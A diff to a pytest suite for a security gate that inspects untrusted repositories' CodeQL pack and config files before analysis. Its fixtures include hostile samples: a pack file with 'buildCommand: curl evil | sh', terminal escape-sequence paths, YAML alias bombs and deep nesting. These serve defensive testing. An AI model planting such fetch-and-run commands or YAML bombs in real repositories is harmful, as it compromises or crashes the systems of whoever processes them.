@@ -1,7 +1,7 @@
 """Tests for ``core.security.codeql_trust``.
 
 Mirrors the structure of ``test_cc_trust.py``:
-  - cache reset + trust-override reset autouse fixtures
+  - trust-override reset autouse fixture (the scan is uncached)
   - per-class grouping by source-file shape (no config / pack only /
     config only / both / structural pathologies)
   - asserts both the verdict and the printed output (operator visibility)
@@ -14,34 +14,22 @@ from pathlib import Path
 
 import pytest
 
-# packages/cve_diff/tests/... — we ensure the repo root is on sys.path so
-# tests can run when invoked from a sub-directory pytest.
-try:
-    sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
-except IndexError:                                     # pragma: no cover
-    pass
-
 from core.security.codeql_trust import (
     check_repo_codeql_trust,
     set_trust_override,
-    _scan_cached,
 )
 
 
 @pytest.fixture(autouse=True)
-def _clear_trust_cache():
-    """Fresh cache per test so prints happen deterministically."""
-    _scan_cached.cache_clear()
-    yield
-    _scan_cached.cache_clear()
+def _reset_trust_override(monkeypatch):
+    from core.security import codeql_trust as trust
+    from core.testing.module_state import isolated_module_state
 
-
-@pytest.fixture(autouse=True)
-def _reset_trust_override():
-    """Reset the module-level trust flag between tests."""
-    set_trust_override(False)
-    yield
-    set_trust_override(False)
+    with isolated_module_state(trust, {"_trust_override_set": False}):
+        try:
+            yield
+        finally:
+            monkeypatch.undo()
 
 
 _check = check_repo_codeql_trust
@@ -61,8 +49,128 @@ class TestNoConfig:
         """``Path("").resolve()`` would yield CWD — guard skips."""
         assert _check("") is False
 
-    def test_nonexistent_path(self, tmp_path):
+
+class TestUnexaminableTarget:
+    """A SUPPLIED repo the checker cannot resolve or stat is refused
+    (fail-closed), mirroring cc_trust: a "clean" verdict over an
+    unexamined path waved the gate open for vanished (TOCTOU),
+    mistyped, and pathological paths. The trust override downgrades to
+    warn-and-proceed like any real finding."""
+
+    def test_nonexistent_path_refuses(self, tmp_path, capsys):
+        assert _check(str(tmp_path / "does-not-exist")) is True
+        out = capsys.readouterr().out
+        assert "cannot examine" in out
+        assert "treating as dangerous" in out
+
+    def test_nonexistent_path_trust_override_proceeds(self, tmp_path, capsys):
+        set_trust_override(True)
         assert _check(str(tmp_path / "does-not-exist")) is False
+        out = capsys.readouterr().out
+        assert "cannot examine" in out
+        assert "trust override active" in out
+
+    def test_null_byte_in_path_refuses(self):
+        assert _check("./weird\x00path") is True
+
+    def test_very_long_path_refuses(self):
+        assert _check("/" + "a" * 10_000) is True
+
+    def test_message_bounds_and_escapes_the_path(self, tmp_path, capsys):
+        hostile = str(tmp_path / ("evil\x1b]0;pwned\x07" + "x" * 400))
+        assert _check(hostile) is True
+        out = capsys.readouterr().out
+        assert "\x1b" not in out and "\x07" not in out
+
+
+class TestIncompleteEnumeration:
+    """An enumeration that skipped subtrees is not a verdict: os.walk's
+    default skips unlistable dirs silently, so unreadable (or mid-walk
+    vanished) subtrees previously yielded "clean" over pack files the
+    gate never saw — and modes can flip readable again before
+    `codeql database create` runs (the mode-flip TOCTOU variant)."""
+
+    def test_unlistable_subdir_blocks(self, tmp_path, capsys):
+        import os as _os
+        if _os.geteuid() == 0:
+            pytest.skip("root ignores directory mode bits")
+        hidden = tmp_path / "vendor"
+        hidden.mkdir()
+        (hidden / "qlpack.yml").write_text("name: x\n")
+        hidden.chmod(0)
+        try:
+            blocked = _check(str(tmp_path))
+        finally:
+            hidden.chmod(0o700)
+        assert blocked is True
+        assert "scan_incomplete" in capsys.readouterr().out
+
+    def test_symlinked_github_to_unreadable_blocks(self, tmp_path, capsys):
+        """The one hiding shape the walk lane cannot see: `.github` as
+        a SYMLINK (symlinked dirs are listed, never entered — no walk
+        error fires) to an unreadable tree holding codeql-config.yml.
+        Only the os.lstat presence probe reaches it; the pathlib-based
+        probe swallowed the EACCES on 3.13+ and scanned nothing."""
+        import os as _os
+        if _os.geteuid() == 0:
+            pytest.skip("root ignores directory mode bits")
+        hidden = tmp_path / "hidden"
+        (hidden / "codeql").mkdir(parents=True)
+        (hidden / "codeql" / "codeql-config.yml").write_text("packs: [x]\n")
+        repo = tmp_path / "repo"
+        repo.mkdir()
+        (repo / ".github").symlink_to(hidden)
+        hidden.chmod(0)
+        try:
+            blocked = _check(str(repo))
+        finally:
+            hidden.chmod(0o700)
+        assert blocked is True
+        assert "oversized/unreadable" in capsys.readouterr().out
+
+    def test_path_present_probe_error_reports_present(self, monkeypatch):
+        """Version-stable probe semantics: pathlib's exists()/is_symlink()
+        raise on probe errors on ≤3.12 and swallow to False on 3.13+ —
+        both wrong here. The os.lstat probe reports EACCES-class errors
+        as present (scanned → blocked) and only ENOENT/ENOTDIR as
+        absent."""
+        from core.security.codeql_trust import _path_present
+        import os as _os
+
+        def _raise(err):
+            def _l(_p):
+                raise OSError(err, _os.strerror(err))
+            return _l
+
+        import errno as _errno
+        from types import ModuleType
+        from core.security import capped_read
+
+        local_os = ModuleType("probe_os")
+        vars(local_os).update(vars(_os))
+        monkeypatch.setattr(capped_read, "os", local_os)
+        monkeypatch.setattr(local_os, "lstat", _raise(_errno.EACCES))
+        assert _path_present(Path("/probe/denied")) is True
+        monkeypatch.setattr(local_os, "lstat", _raise(_errno.ENOENT))
+        assert _path_present(Path("/probe/gone")) is False
+        monkeypatch.setattr(local_os, "lstat", _raise(_errno.ENOTDIR))
+        assert _path_present(Path("/probe/notdir")) is False
+
+    def test_unlistable_target_root_blocks(self, tmp_path, capsys):
+        import os as _os
+        if _os.geteuid() == 0:
+            pytest.skip("root ignores directory mode bits")
+        repo = tmp_path / "repo"
+        repo.mkdir()
+        # stat needs only traversal to the dir (parent +x); listing
+        # needs the dir's own read bit — mode 0 is stat-able, unlistable
+        repo.chmod(0)
+        try:
+            blocked = _check(str(repo))
+        finally:
+            repo.chmod(0o700)
+        assert blocked is True
+        assert "scan_incomplete" in capsys.readouterr().out
 
 
 # ---------------------------------------------------------------------------
@@ -92,7 +200,11 @@ class TestPackFile:
         assert _check(str(tmp_path)) is True
         out = capsys.readouterr().out
         assert "extractor" in out
-        assert "evil-binary" in out
+        # Masked rendering: identifying prefix only — extractor command
+        # lines can embed credentials and scan output is CI-retained.
+        assert "./build/" in out
+        assert "evil-binary" not in out
+        assert "***" in out
 
     def test_non_canonical_dependency_blocks(self, tmp_path, capsys):
         (tmp_path / "qlpack.yml").write_text(
@@ -107,6 +219,29 @@ class TestPackFile:
         assert "evilcorp/exploits" in out
         # Canonical dep should NOT trigger a finding line of its own.
         assert "codeql/python-all" not in out.split("non-canonical dep")[1]
+
+    def test_namespace_traversal_dependency_blocks(self, tmp_path, capsys):
+        """``codeql/../evil-pack`` shares the canonical prefix but names
+        a different namespace — a bare startswith test accepted it."""
+        (tmp_path / "qlpack.yml").write_text(
+            "name: my/pack\n"
+            "dependencies:\n"
+            "  codeql/../evil-pack: '*'\n"
+        )
+        assert _check(str(tmp_path)) is True
+        out = capsys.readouterr().out
+        assert "non-canonical dep" in out
+
+    def test_versioned_canonical_dependency_list_silent(self, tmp_path, capsys):
+        # Two-direction guard: the list form carries ``name@version``
+        # specs — a well-formed canonical spec must stay silent.
+        (tmp_path / "qlpack.yml").write_text(
+            "name: my/pack\n"
+            "dependencies:\n"
+            "  - codeql/cpp-all@1.0.0\n"
+        )
+        assert _check(str(tmp_path)) is False
+        assert capsys.readouterr().out == ""
 
     def test_build_command_blocks(self, tmp_path, capsys):
         (tmp_path / "qlpack.yml").write_text(
@@ -251,6 +386,45 @@ class TestCodeqlConfig:
         assert "non-canonical pack" in out
         assert "evilcorp/all" in out
 
+    def test_namespace_traversal_pack_blocks(self, tmp_path, capsys):
+        self._write_config(tmp_path,
+            "name: x\n"
+            "packs:\n"
+            "  python:\n"
+            "    - codeql/../evil-pack\n"
+        )
+        assert _check(str(tmp_path)) is True
+        out = capsys.readouterr().out
+        assert "non-canonical pack" in out
+
+    def test_canonical_pack_with_version_and_suite_path_silent(
+        self, tmp_path, capsys,
+    ):
+        # Two-direction guard: the codeql-config pack syntax allows
+        # ``scope/name@version:path`` — a canonical pack with an
+        # in-pack suite path must stay silent.
+        self._write_config(tmp_path,
+            "name: ok\n"
+            "packs:\n"
+            "  python:\n"
+            "    - codeql/python-queries@~7.0.0:codeql-suites/python-security.qls\n"
+        )
+        assert _check(str(tmp_path)) is False
+        assert capsys.readouterr().out == ""
+
+    def test_canonical_pack_suite_path_traversal_blocks(
+        self, tmp_path, capsys,
+    ):
+        self._write_config(tmp_path,
+            "name: x\n"
+            "packs:\n"
+            "  python:\n"
+            "    - codeql/python-queries:../outside/suite.qls\n"
+        )
+        assert _check(str(tmp_path)) is True
+        out = capsys.readouterr().out
+        assert "non-canonical pack" in out
+
     def test_external_query_blocks(self, tmp_path, capsys):
         self._write_config(tmp_path,
             "name: x\n"
@@ -315,11 +489,36 @@ class TestStructural:
         assert "symlink" in capsys.readouterr().out
 
     def test_oversized_pack_file_blocks(self, tmp_path, capsys):
-        # 2 MiB pack file — beyond the 1 MiB cap.
+        # 2 MiB pack file — well beyond the cap.
         big = "name: x\n" + ("# pad\n" * 350_000)
         (tmp_path / "qlpack.yml").write_text(big)
         assert _check(str(tmp_path)) is True
         assert "oversized" in capsys.readouterr().out
+
+    def test_pack_file_one_byte_over_cap_blocks(self, tmp_path, capsys):
+        """Boundary pin on the SHARED cap: one byte over refuses.
+
+        Both trust gates read config through the shared bounded read
+        (core.security._trust_common.read_trust_config), so this gate's
+        refusal threshold is MAX_TRUST_CONFIG_BYTES exactly — not a
+        private per-gate cap that can drift from the cc gate's again.
+        """
+        from core.security._trust_common import MAX_TRUST_CONFIG_BYTES
+        body = b"name: x\n# " + b"p" * (MAX_TRUST_CONFIG_BYTES - 10) + b"\n"
+        assert len(body) == MAX_TRUST_CONFIG_BYTES + 1
+        (tmp_path / "qlpack.yml").write_bytes(body)
+        assert _check(str(tmp_path)) is True
+        assert "oversized" in capsys.readouterr().out
+
+    def test_pack_file_at_cap_scans(self, tmp_path, capsys):
+        """A benign pack file of exactly the cap still gets scanned
+        (and produces no findings) — the boundary is over, not at."""
+        from core.security._trust_common import MAX_TRUST_CONFIG_BYTES
+        body = b"name: x\n# " + b"p" * (MAX_TRUST_CONFIG_BYTES - 11) + b"\n"
+        assert len(body) == MAX_TRUST_CONFIG_BYTES
+        (tmp_path / "qlpack.yml").write_bytes(body)
+        assert _check(str(tmp_path)) is False
+        assert capsys.readouterr().out == ""
 
     def test_raptor_self_scan_short_circuits(self, capsys):
         """Operator running RAPTOR against RAPTOR itself isn't an
@@ -345,7 +544,6 @@ class TestTrustOverride:
         )
         # First confirm without override blocks.
         assert _check(str(tmp_path)) is True
-        _scan_cached.cache_clear()  # so the warning re-renders below
         capsys.readouterr()  # drop output
         # Set override and confirm pass + override-active warning.
         set_trust_override(True)
@@ -394,14 +592,405 @@ class TestCombined:
         assert "codeql-config.yml" in out
 
     def test_findings_use_safe_truncation(self, tmp_path, capsys):
-        """Long extractor values must be truncated; control chars stripped."""
+        """Long extractor values are masked: prefix + length, no dump."""
         long_extractor = "./" + "evil" * 100  # 402 chars
         (tmp_path / "qlpack.yml").write_text(
             f"name: x\nextractor: '{long_extractor}'\n"
         )
         _check(str(tmp_path))
         out = capsys.readouterr().out
-        # Truncated to ~120 chars + "..."
-        assert "..." in out
+        assert "*** (402 chars)" in out
         # Doesn't dump the full 400+ chars
         assert long_extractor not in out
+
+
+# ---------------------------------------------------------------------------
+# Pack-file cap warning
+# ---------------------------------------------------------------------------
+
+
+class TestPackFileCapWarning:
+    """The pack-file walker caps at _MAX_PACK_FILES. Verify a warning is
+    emitted so operators know additional files were NOT inspected."""
+
+    @pytest.mark.slow
+    def test_warning_emitted_when_cap_reached(self, tmp_path, caplog):
+        import logging
+
+        from core.security.codeql_trust import _MAX_PACK_FILES, _scan_repo
+
+        for i in range(_MAX_PACK_FILES + 5):
+            d = tmp_path / f"pkg{i:04d}"
+            d.mkdir()
+            (d / "qlpack.yml").write_text(f"name: test/pkg{i}\nversion: 1.0.0\n")
+
+        with caplog.at_level(logging.WARNING, logger="core.security.codeql_trust"):
+            _scan_repo(str(tmp_path.resolve()))
+
+        assert any("capped at" in rec.message for rec in caplog.records), (
+            "Expected a warning about the pack-file cap being reached"
+        )
+        assert str(_MAX_PACK_FILES) in caplog.text
+
+    def test_no_warning_below_cap(self, tmp_path, caplog):
+        import logging
+
+        from core.security.codeql_trust import _scan_repo
+
+        for i in range(2):
+            d = tmp_path / f"pkg{i}"
+            d.mkdir()
+            (d / "qlpack.yml").write_text(f"name: test/pkg{i}\nversion: 1.0.0\n")
+
+        with caplog.at_level(logging.WARNING, logger="core.security.codeql_trust"):
+            _scan_repo(str(tmp_path.resolve()))
+
+        assert not any("capped at" in rec.message for rec in caplog.records)
+
+
+# ---------------------------------------------------------------------------
+# Regression: scalar string values in packs dict silently dropped
+# ---------------------------------------------------------------------------
+
+
+class TestScalarPackValue:
+    def test_scalar_string_pack_ref_detected(self, tmp_path, capsys):
+        """A codeql-config.yml where one language key has a scalar string
+        pack reference (not wrapped in a list). Pre-fix: the ``isinstance
+        (refs, list)`` guard silently dropped scalar strings; the
+        non-canonical pack slipped through undetected.
+
+        After fix: ``elif isinstance(refs, str)`` catches the scalar and
+        appends it to the flat list for inspection."""
+        gh = tmp_path / ".github" / "codeql"
+        gh.mkdir(parents=True)
+        (gh / "codeql-config.yml").write_text(
+            "name: x\n"
+            "packs:\n"
+            "  python: evilcorp/backdoor\n"  # scalar string, not a list
+        )
+        assert _check(str(tmp_path)) is True
+        out = capsys.readouterr().out
+        assert "non-canonical pack" in out
+        assert "evilcorp/backdoor" in out
+
+
+# ---------------------------------------------------------------------------
+# Capped enumeration is a blocking verdict, not a partial result
+# ---------------------------------------------------------------------------
+
+
+class TestPackFileCapBlocks:
+    """A verdict computed from a knowably-incomplete enumeration is no
+    verdict: reaching the pack-file cap must block (operator overrides
+    deliberately via --trust-repo), and one flooded filename must not
+    starve enumeration of the other pattern."""
+
+    @pytest.mark.slow
+    def test_cap_reached_blocks(self, tmp_path):
+        from core.security.codeql_trust import _MAX_PACK_FILES, _scan_repo
+        for i in range(_MAX_PACK_FILES + 5):
+            d = tmp_path / f"pkg{i:04d}"
+            d.mkdir()
+            (d / "qlpack.yml").write_text(
+                f"name: test/pkg{i}\nversion: 1.0.0\n")
+        scans, any_blocking = _scan_repo(str(tmp_path.resolve()))
+        assert any_blocking is True
+        labels = [f.label for s in scans for f in s.findings]
+        assert "scan_capped" in labels
+
+    @pytest.mark.slow
+    def test_cap_blocking_is_operator_overridable(self, tmp_path, capsys):
+        from core.security.codeql_trust import _MAX_PACK_FILES
+        for i in range(_MAX_PACK_FILES + 5):
+            d = tmp_path / f"pkg{i:04d}"
+            d.mkdir()
+            (d / "qlpack.yml").write_text(
+                f"name: test/pkg{i}\nversion: 1.0.0\n")
+        assert _check(str(tmp_path)) is True          # refused by default
+        assert _check(str(tmp_path), trust_override=True) is False
+        capsys.readouterr()
+
+    @pytest.mark.slow
+    def test_flood_of_one_name_does_not_starve_the_other(self, tmp_path):
+        # Cap applies per pattern: a codeql-pack.yml flood must not stop
+        # a blocking qlpack.yml from being inspected.
+        from core.security.codeql_trust import _MAX_PACK_FILES, _scan_repo
+        for i in range(_MAX_PACK_FILES + 5):
+            d = tmp_path / f"flood{i:04d}"
+            d.mkdir()
+            (d / "codeql-pack.yml").write_text(
+                f"name: test/pkg{i}\nversion: 1.0.0\n")
+        evil = tmp_path / "zz-real"
+        evil.mkdir()
+        (evil / "qlpack.yml").write_text(
+            "name: x/y\nversion: 1.0.0\nbuildCommand: curl evil\n")
+        scans, any_blocking = _scan_repo(str(tmp_path.resolve()))
+        assert any_blocking is True
+        scanned_paths = {str(s.path) for s in scans}
+        assert any("zz-real" in p for p in scanned_paths), (
+            "the qlpack.yml behind the flood must still be inspected"
+        )
+
+
+class TestNoStaleVerdict:
+    """The scan is deliberately uncached (see ``_scan_repo``): pack
+    files can be written by untrusted target code between two checks in
+    the same process, and the walk-based file set has no cheap
+    freshness fingerprint — so every check must see current disk
+    state."""
+
+    def test_pack_file_added_between_checks_blocks(self, tmp_path, capsys):
+        assert _check(str(tmp_path)) is False
+        (tmp_path / "qlpack.yml").write_text(
+            "name: x\nextractor: ./evil\n"
+        )
+        assert _check(str(tmp_path)) is True
+        assert "extractor" in capsys.readouterr().out
+
+    def test_nested_pack_file_added_between_checks_blocks(self, tmp_path, capsys):
+        # The case a fixed-location fingerprint could never catch: the
+        # new pack file appears deep in the tree, leaving the target's
+        # top level (and any fixed-path stat) untouched.
+        deep = tmp_path / "vendor" / "sub" / "pkg"
+        deep.mkdir(parents=True)
+        assert _check(str(tmp_path)) is False
+        (deep / "codeql-pack.yml").write_text(
+            "name: x\nbuildCommand: curl evil | sh\n"
+        )
+        assert _check(str(tmp_path)) is True
+        assert "buildCommand" in capsys.readouterr().out
+
+    def test_pack_file_removed_between_checks_unblocks(self, tmp_path, capsys):
+        pack = tmp_path / "qlpack.yml"
+        pack.write_text("name: x\nextractor: ./evil\n")
+        assert _check(str(tmp_path)) is True
+        pack.unlink()
+        assert _check(str(tmp_path)) is False
+        capsys.readouterr()
+
+
+class TestExtraStripSpelling:
+    """The U+2028/U+2029 strip set must work AND stay visibly spelled.
+
+    The set was once written with the literal (invisible) characters:
+    indistinguishable in an editor from two quoted blanks, so an
+    accidental "cleanup" to real spaces would have silently disabled
+    the line-separator defence while corrupting every space in
+    sanitised output. Pin both the behaviour and the escaped source
+    spelling (matching cc_trust)."""
+
+    def test_line_separators_stripped(self):
+        from core.security._trust_common import EXTRA_STRIP
+        from core.security.codeql_trust import _safe
+        # chr() spellings so THIS file carries no invisible
+        # literals either.
+        _ls, _ps = chr(0x2028), chr(0x2029)
+        assert EXTRA_STRIP == {_ls, _ps}
+        assert _safe(f"a{_ls}b{_ps}c") == "a?b?c"
+        # Ordinary spaces must survive — the failure mode the literal
+        # spelling invited.
+        assert _safe("a b") == "a b"
+
+    def test_source_uses_escaped_forms(self):
+        # The strip set lives in the shared trust-gate helper layer;
+        # its source must carry the escaped spellings, and this gate's
+        # source must stay free of the invisible literals.
+        import core.security._trust_common as common
+        import core.security.codeql_trust as mod
+        common_src = Path(common.__file__).read_text(encoding="utf-8")
+        assert "u2028" in common_src and "u2029" in common_src, (
+            "_trust_common.py lost the escaped U+2028/U+2029 "
+            "spellings — the set must stay reviewable")
+        for m, name in ((common, "_trust_common.py"),
+                        (mod, "codeql_trust.py")):
+            src = Path(m.__file__).read_text(encoding="utf-8")
+            assert chr(0x2028) not in src and chr(0x2029) not in src, (
+                f"{name} contains literal U+2028/U+2029 — use "
+                "the escaped spellings so the set stays reviewable")
+
+
+# ---------------------------------------------------------------------------
+# Directory-symlink containment (hostile-repo walk)
+# ---------------------------------------------------------------------------
+
+
+class TestWalkNeverFollowsDirectorySymlinks:
+    """The scan runs against untrusted repos BEFORE ``codeql
+    database create``, so a repo shipping ``dir -> <host path>``
+    must not steer the trust gate at host files (or into a symlink
+    loop). pathlib's ``**`` recurses into directory symlinks only
+    via 3.13's ``recurse_symlinks=True`` opt-in (it's
+    ``glob.glob(recursive=True)`` that followed them by default);
+    the walk is pinned to os.walk(followlinks=False) semantics so
+    the refusal stays explicit on every supported interpreter."""
+
+    def test_out_of_repo_dir_symlink_not_followed(self, tmp_path, capsys):
+        outside = tmp_path / "outside"
+        (outside / "pack").mkdir(parents=True)
+        (outside / "pack" / "qlpack.yml").write_text(
+            "extractor: /bin/evil\n")
+        repo = tmp_path / "repo"
+        repo.mkdir()
+        (repo / "vendored").symlink_to(outside, target_is_directory=True)
+        # Host-side pack content behind the link must NOT surface as a
+        # repo finding (nor block dispatch).
+        assert _check(str(repo)) is False
+        assert "qlpack" not in capsys.readouterr().out
+
+    def test_symlink_loop_terminates_and_scans_real_files(
+        self, tmp_path, capsys,
+    ):
+        repo = tmp_path / "repo"
+        (repo / "a").mkdir(parents=True)
+        (repo / "a" / "loop").symlink_to(repo, target_is_directory=True)
+        (repo / "qlpack.yml").write_text("extractor: /bin/evil\n")
+        # Terminates (no unbounded walk) and the real blocking file is
+        # still found exactly once.
+        assert _check(str(repo)) is True
+        assert capsys.readouterr().out.count("extractor") == 1
+
+    def test_dir_symlink_named_like_pack_file_still_blocks(
+        self, tmp_path, capsys,
+    ):
+        """A symlink NAMED qlpack.yml (even one pointing at a
+        directory) is a structural blocking finding, same as the
+        file-symlink case."""
+        outside = tmp_path / "outside-dir"
+        outside.mkdir()
+        repo = tmp_path / "repo"
+        repo.mkdir()
+        (repo / "qlpack.yml").symlink_to(
+            outside, target_is_directory=True)
+        assert _check(str(repo)) is True
+        assert "symlink" in capsys.readouterr().out
+
+
+class TestHostileYamlBounded:
+    """Hostile YAML must yield a blocking finding (Untrusted verdict,
+    loud reason) — never a crash of the operator process the gate
+    runs in. The alias-amplification shape (`aN: &aN [*a(N-1),*a(N-1)]`
+    + `extractor: *aN`) turned ~600 bytes into a 2^depth expansion at
+    the scanner's ``str()``; flow/block deep nesting abuses the loader
+    stack instead."""
+
+    @staticmethod
+    def _alias_bomb(depth: int) -> str:
+        lines = ['a0: &a0 ["xxxxxxxx","xxxxxxxx"]']
+        for i in range(1, depth + 1):
+            lines.append(f"a{i}: &a{i} [*a{i - 1},*a{i - 1}]")
+        lines.append(f"extractor: *a{depth}")
+        return "\n".join(lines) + "\n"
+
+    def test_alias_refused_in_process(self, tmp_path):
+        from core.security.codeql_trust import _scan_pack_file
+        p = tmp_path / "qlpack.yml"
+        p.write_text(self._alias_bomb(3))
+        fs = _scan_pack_file(p)
+        assert fs.has_blocking()
+        labels = {f.label for f in fs.findings}
+        assert "malformed YAML" in labels
+        assert any("alias" in f.value for f in fs.findings)
+
+    @pytest.mark.linux_native
+    def test_alias_bomb_bounded_under_memory_cap(self, tmp_path):
+        """Depth-30 bomb (~660 bytes → tens of GiB if expanded) under
+        a 2 GiB address-space cap: must exit cleanly with a blocking
+        malformed-YAML finding, not die on memory exhaustion."""
+        import subprocess
+        p = tmp_path / "qlpack.yml"
+        p.write_text(self._alias_bomb(30))
+        code = (
+            "import resource, sys\n"
+            "resource.setrlimit(resource.RLIMIT_AS,"
+            " (2 << 30, 2 << 30))\n"
+            "from core.security.codeql_trust import _scan_pack_file\n"
+            "fs = _scan_pack_file(__import__('pathlib').Path(sys.argv[1]))\n"
+            "assert fs.has_blocking()\n"
+            "assert any(f.label == 'malformed YAML' for f in fs.findings)\n"
+            "print('BLOCKED-CLEANLY')\n"
+        )
+        proc = subprocess.run(
+            [sys.executable, "-c", code, str(p)],
+            capture_output=True, text=True, timeout=60,
+            cwd=str(Path(__file__).resolve().parents[3]),
+        )
+        assert proc.returncode == 0, proc.stderr[-2000:]
+        assert "BLOCKED-CLEANLY" in proc.stdout
+
+    def test_deep_flow_nesting_refused(self, tmp_path):
+        from core.security.codeql_trust import _scan_pack_file
+        p = tmp_path / "qlpack.yml"
+        p.write_text("extractor: " + "[" * 5000 + "]" * 5000 + "\n")
+        fs = _scan_pack_file(p)
+        assert fs.has_blocking()
+        assert any("flow nesting" in f.value for f in fs.findings)
+
+    def test_deep_block_nesting_refused_not_crash(self, tmp_path):
+        """Second stack-abuse encoding: block-mapping depth (no flow
+        brackets, so the pre-bound never fires) must surface as the
+        blocking malformed-YAML finding via the escape-error catch."""
+        from core.security.codeql_trust import _scan_pack_file
+        depth = 20_000
+        p = tmp_path / "qlpack.yml"
+        p.write_text("".join(f"{' ' * i}k:\n" for i in range(depth)))
+        fs = _scan_pack_file(p)
+        assert fs.has_blocking()
+
+    def test_container_extractor_flagged_without_stringify(self, tmp_path):
+        from core.security.codeql_trust import _scan_pack_file
+        p = tmp_path / "qlpack.yml"
+        p.write_text("extractor:\n  - a\n  - b\n")
+        fs = _scan_pack_file(p)
+        assert any(f.label == "extractor (unrecognised shape)"
+                   and f.blocking for f in fs.findings)
+
+    def test_container_dep_flagged_without_stringify(self, tmp_path):
+        from core.security.codeql_trust import _scan_pack_file
+        p = tmp_path / "qlpack.yml"
+        p.write_text("dependencies:\n  codeql/cpp-all:\n    nested: {a: 1}\n")
+        fs = _scan_pack_file(p)
+        assert fs.has_blocking()
+        assert any("unrecognised shape" in f.label for f in fs.findings)
+
+    def test_config_yaml_alias_refused(self, tmp_path):
+        from core.security.codeql_trust import _scan_codeql_config
+        cfg = tmp_path / "codeql-config.yml"
+        cfg.write_text(self._alias_bomb(3))
+        fs = _scan_codeql_config(cfg)
+        assert fs.has_blocking()
+
+    def test_benign_pack_shapes_unchanged(self, tmp_path):
+        """Two-direction pin: the fix must not reclassify legitimate
+        pack files — canonical deps (dict and null-version forms) stay
+        silent, a string extractor still blocks under its own label."""
+        from core.security.codeql_trust import _scan_pack_file
+        p = tmp_path / "qlpack.yml"
+        p.write_text(
+            "name: my/pack\nversion: 0.0.1\n"
+            "dependencies:\n  codeql/cpp-all: '*'\n  codeql/ssa:\n"
+        )
+        assert _scan_pack_file(p).findings == []
+        p.write_text("extractor: cpp\n")
+        fs = _scan_pack_file(p)
+        assert [f.label for f in fs.findings] == ["extractor"]
+        assert fs.has_blocking()
+
+
+class TestYamlAnchorsTwoDirection:
+    def test_anchor_without_alias_loads_fine(self, tmp_path):
+        # Anchors alone are legal noise some emitters produce; only
+        # ALIASES (the amplification primitive) are refused.
+        from core.security.codeql_trust import _scan_pack_file
+        p = tmp_path / "qlpack.yml"
+        p.write_text("name: p\nversion: &v 1.0.0\n"
+                     "dependencies:\n  codeql/cpp-all: '*'\n")
+        assert _scan_pack_file(p).findings == []
+
+    def test_merge_key_alias_refused(self, tmp_path):
+        from core.security.codeql_trust import _scan_pack_file
+        p = tmp_path / "qlpack.yml"
+        p.write_text("base: &b {a: 1}\nx:\n  <<: *b\nextractor: cpp\n")
+        fs = _scan_pack_file(p)
+        assert fs.has_blocking()
+        assert any("alias" in f.value for f in fs.findings)
